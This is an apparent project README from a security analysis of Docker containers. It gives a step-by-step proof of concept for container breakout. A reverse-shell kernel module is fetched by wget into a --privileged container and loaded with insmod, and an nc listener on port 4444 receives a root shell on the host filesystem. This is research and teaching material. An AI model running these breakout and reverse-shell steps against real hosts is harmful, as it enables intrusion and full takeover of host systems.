# Security Analysis of Containerizd Applications

> A security analysis conducted on containerised applications in virtualised environments.

## Introduction

Containerization is defined as a form of operating system virtualization, through which applications are run in isolated user spaces called containers, all using the same shared operating system (OS).The concept of Containerization is used in many fields such as DevOps, Microservice Architecture, Web servers and Database Sharding. This makes security a major concern.

This aim for this project is to conduct a Security Analysis of Containerized Applications in Virtualized Environments to check for vulnerabilities in the host Operating System by using several methods such as inspecting the Network bridge between the Virtualized and Host Operating System, Figuring Kernel Level Virtualization Errors, Creating a Malicious Application and Test a proof of concept, if the Host OS can be accessed from a container that is running in a virtualized environment.

 > Containerization Tool used for this Analysis is Docker

## Attack Vectors

### Modifying Kernel Space using --privileged flag

> This attack is to simulate Container Breakout and the process through which an attacker who has gained access of a Container running on a System can get access to a system can load a kernel module on to the Host Kernel Space through the Container to get a reverse shell session of the Host file System mounted on the root directory.

**Steps**:

1. Change the directory to *reverseshell* and run the command *make* to build the Kernel File.
  ```bash
  cd reverseshell
  make
  ```
2. Start a Python Server in the *reverseshell* directory using the command:
  ```bash
  python3 -m http.server
  ```
3.  On a New Terminal Tab Run a Base container (here alpine) with a privileged flag and start a shell session in it using the command:
  ```bash
  docker run --rm --privileged -it alpine sh
  ```
4. Fetch the Kernel File from the server started in Step 2 using the command 
  ```bash
  wget http://172.17.0.1:8000/reverseshell_module.ko
  ```
5. Give Executable Permission to the Kernel File inside the Container using the command 
  ```bash
  chmod +x reverseshell_module.ko
  ```
6. On a New Terminal Start a Port listener on Port number 4444 as specified in the Kernel Module C Program using the command: 
  ```bash
  nc -nlvp 4444
  ```
7. Inside the Container shell of Step 3 write the Kernel Module into the Kernel Space using the command:
  ```bash
  insmod reverseshell_module.ko
  ```
**Result**

> Upon following the above a Shell session of the Host File System mounted on the root directory is received on the Port listener. This even provides privileges to access, read and modify files through the reverse shell session. This can be classified as a high level vulnerability.
